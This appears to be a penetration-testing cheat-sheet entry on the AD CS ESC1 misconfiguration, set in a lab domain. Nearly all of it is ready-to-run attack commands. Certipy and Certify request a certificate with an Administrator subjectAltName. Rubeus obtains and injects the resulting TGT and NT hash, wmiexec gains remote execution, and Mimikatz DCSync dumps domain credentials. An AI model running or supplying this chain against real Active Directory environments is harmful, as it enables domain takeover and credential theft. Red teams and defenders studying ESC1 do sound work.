# 13.03 ESC1 Enrollee Supplies SAN

> Request a cert with `SAN=Administrator` against EnrolleeSuppliesSubject templates and authenticate for the target's TGT/NT hash.

## Overview

Templates with EnrolleeSuppliesSubject allow the requester to set an arbitrary subjectAltName. Requesting a cert with SAN=Administrator then authenticating yields a TGT or NT hash for that account. Works from both Linux (certipy) and Windows (Certify.exe + Rubeus).

## Steps

- Confirm template has: Enrollee Supplies Subject: True, Client Authentication: True, Manager Approval: False, Authorized Signatures: 0
- From Linux: `certipy req -upn Administrator` then `certipy auth -pfx`
- Use the .ccache TGT with wmiexec/smbexec (requires DNS resolution for the domain)
- From Windows: `Certify.exe request /altname:Administrator`, convert cert.pem to pfx with OpenSSL
- Authenticate with `Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials`
- Use `Rubeus createnetonly` + `Rubeus ptt` to inject the TGT into a sacrificial session
- Use Invoke-Mimikatz DCSync after injecting the TGT for credential dumping

## Commands

### certipy req ESC1

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -dc-ip <TARGET> -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```

### certipy auth

```bash
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip <TARGET>
```

### wmiexec with TGT

```bash
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

### Certify.exe ESC1 request

```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:Administrator
```

### OpenSSL convert cert

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Rubeus asktgt + getcredentials

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

### Rubeus createnetonly

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
```

### Rubeus ptt

```powershell
.\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>
```

### Mimikatz DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'
```
